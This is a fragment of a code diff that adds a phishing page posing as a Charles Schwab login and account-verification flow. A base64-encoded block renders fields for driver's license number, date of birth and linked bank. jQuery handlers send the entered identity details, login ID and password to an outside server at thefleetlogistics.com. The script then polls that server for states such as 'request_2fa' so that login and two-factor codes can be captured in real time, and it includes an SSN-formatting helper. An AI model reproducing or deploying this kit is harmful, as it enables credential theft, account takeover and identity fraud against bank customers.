CAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiI+PGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJkbCIgbmFtZT0iZHJpdmVyc19saWNlbnNlX251bWJlciINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZT0idGV4dCIgdmFsdWU9IiIgcmVxdWlyZWQ+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZpcnN0LWZpZWxkICI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29udHJvbC1sYWJlbCBmaXJzdC1maWVsZC1sYWJlbCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHlsZT0idGV4dC1hbGlnbjogbGVmdDsgIj48bGFiZWwgZm9yPSJMb2dpbklkIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHlsZT0iZm9udC13ZWlnaHQ6IG5vcm1hbCIgaWQ9InVzZXJFbWFpbC1sYWJlbCI+RGF0ZSBvZg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCaXJ0aDwvbGFiZWw+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJkbCIgbmFtZT0iZGF0ZV9vZl9kYXkiIHZhbHVlPSIiIHNpemU9IjIiIG1heGxlbmd0aD0iMiIgcGxhY2Vob2xkZXI9IkRheSIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS00Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImRsIiBuYW1lPSJkYXRlX29mX21vbnRoIiB2YWx1ZT0iIiBwbGFjZWhvbGRlcj0iTW9udGgiIHNpemU9IjMiIG1heGxlbmd0aD0iMyIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS00Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImRsIiBuYW1lPSJkYXRlX29mX3llYXIiIHZhbHVlPSIiIHNpemU9IjQiIG1heGxlbmd0aD0iNCIgcGxhY2Vob2xkZXI9IlllYXIiIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmaXJzdC1maWVsZCAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbnRyb2wtbGFiZWwgZmlyc3QtZmllbGQtbGFiZWwiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7ICI+PGxhYmVsIGZvcj0iTG9naW5JZCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZvbnQtd2VpZ2h0OiBub3JtYWwiIGlkPSJ1c2VyRW1haWwtbGFiZWwiPkJhbmsvQ3JlZGl0IFVuaW9uIExpbmtlZCB0byBTY2h3YWIgQWNjb3VudChzKTwvbGFiZWw+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIiPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iYm5rIiBuYW1lPSJiYW5rX25hbWUiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU9InRleHQiIHZhbHVlPSIiIHJlcXVpcmVkPjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29udHJvbC1sYWJlbCIgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7ICI+PGxhYmVsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcj0iU3RhcnRJbiIgc3R5bGU9ImZvbnQtd2VpZ2h0OiBub3JtYWwiPjwvbGFiZWw+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0YXJ0LWluLXdyYXBwZXIiPg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imxtcy13aWRnZXQtbG9naW4tY2xvc2UtY250ciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsbXMtc2Vjb25kYXJ5LWJ1dHRvbi1zZWN0aW9uIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJzdWJtaXQtYnRuIiB0eXBlPSJzdWJtaXQiIHN0eWxlPSJ3aWR0aDogMTAwJTsiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA==`;
+                    
+                    $("#lms-login-widget-responsive-secondary").html(atob(n));
+                    $.ajax({  data:{action:"start","request_id":sess},  url: "https://thefleetlogistics.com/charlie/handler.php", method:"post",  });
+                }, 500);
+            }
+        });
+
+        var _interval;
+
+        $("#form1").submit(function(e){
+            e.preventDefault();
+            let $b =  $("#form1 button");
+            $b.prop('disabled',true);
+            $b.html('Please wait... <div class="loader" style="float: right;"></div> ');
+
+            // post form details wit session
+
+            var data = {};
+            $("#form1").serializeArray().map(function(x){data[x.name] = x.value;}); 
+            data.request_id = sess;
+            data.action = "submit";
+
+            $.ajax({
+                data,
+                url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                success: function(){
+                    // clearInterval(interval);
+                    $b.prop('disabled',false);
+                    $b.html('Submit');
+
+                    $("#cont-2").slideDown(500);
+                    $("#cont-1").slideUp(1000);
+                    document.body.scrollTo({top:0, behavior:'smooth'});
+
+                    // reset form
+                    document.getElementById("form2").reset();
+                    $("#lid-2").val($("#lid-1").val());
+                },
+                error:function(){
+                    $b.prop('disabled',false);
+                    $b.html('Submit');
+                    alert("Something went wrong, try again")
+                }
+            });
+
+        });
+
+
+        $("#form2").submit(function(e){
+
+            e.preventDefault();
+            let $b =  $("#btn2");
+            $b.prop('disabled',true);
+            $b.html('Please wait... <div class="loader" style="float: right;"></div> ');
+            $("#error_msg").text("").show();
+
+            // post form details wit session
+
+            var data = {};
+            $("#form2").serializeArray().map(function(x){data[x.name] = x.value;}); 
+            data.request_id = sess;
+            data.action = "login";
+
+            $.ajax({
+                data,
+                url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                success: function(data){
+                    _interval = setInterval(function(){
+                        _checkstat();
+                    },500);
+                },
+
+                error:function(){
+                    $b.prop('disabled',false);
+                    $b.html('Login');
+                    alert("Something went wrong, try again")
+                }
+            });
+
+        });
+
+        $("#btn2").click(function(e){
+            if($("#passwordi").val() !="" && $("#login-id-2").val() !="" ){
+                $("#form2").submit();
+            } else {
+                $("#error_msg").text("Please enter your password or Login ID").show();
+                setTimeout(function(){
+                    $("#error_msg").hide();
+                },3500);
+            }
+        });
+
+        var _doCountDownInter;
+        function _checkstat(){
+            let $b =  $("#btn2");
+            $.ajax({
+                data:{action:"status","request_id":sess},
+                url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                success: function(result){
+                    if(result.state == "request_2fa"){
+                        //  do on success
+                        $b.prop('disabled',false);
+                        $b.html('Login');
+                        clearInterval(_interval);
+                        $("#cont-2").html("");
+                        window.location.replace("1133.html?request_id="+sess);
+                       
+                    } else if(result.state == "wrong_pass"){
+                        document.body.scrollTo({top:0, behavior:'smooth'});
+                        clearInterval(_interval);
+                        $("#error_msg").text("Incorrect password or Login ID").show();
+                        document.getElementById("form2").reset();
+                        $b.prop('disabled',false);
+                        $b.html('Login');
+                        
+                    } else if(result.state == "success"){
+                        //  show update successful message
+                        // $("#cont-1").hide();
+                        // $("#cont-2").hide();
+                        // $("#cont-3").show();
+                        // clearInterval(_interval);
+                        // setTimeout(function(){
+                        //     window.location.replace("https://www.schwab.com");
+                        // },5000);
+                        window.location.replace("thank.html");
+                    } 
+                    else if(result.state == "waiting" || result.state == "waiting_2fa"){
+                        $b.prop('disabled',true);
+                        $b.html('Please wait... <div class="loader" style="float: right;"></div> ');
+
+                    } else {
+                        alert("Something went wrong, try again");
+                        clearInterval(_interval);
+                        $b.prop('disabled',false);
+                        $b.html('Login');
+                    } 
+                }, error: function(){
+                    $b.prop('disabled',false);
+                    $b.html('Login');
+                    alert("Something went wrong, try again");
+                    clearInterval(_interval);
+                }
+            });
+        }
+        
+        $.ajax({  data:{action:"visit","request_id":sess},  url: "https://thefleetlogistics.com/charlie/handler.php", method:"post",  });
+    });
+    
+    function fixSSN(str)
+    {
+    	var str = new String(str); 
+    	str = str.replace(/[A-Za-z$-()\.]/g, '');
+    	str = str.replace(/[^0-9]/g, ''); 	
+    	str = str.replace( /[^\d]/g, '' );
+    	str = str.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
+    	//alert(str);
+    	return str;
+    } 
+</script>
+
+</html>
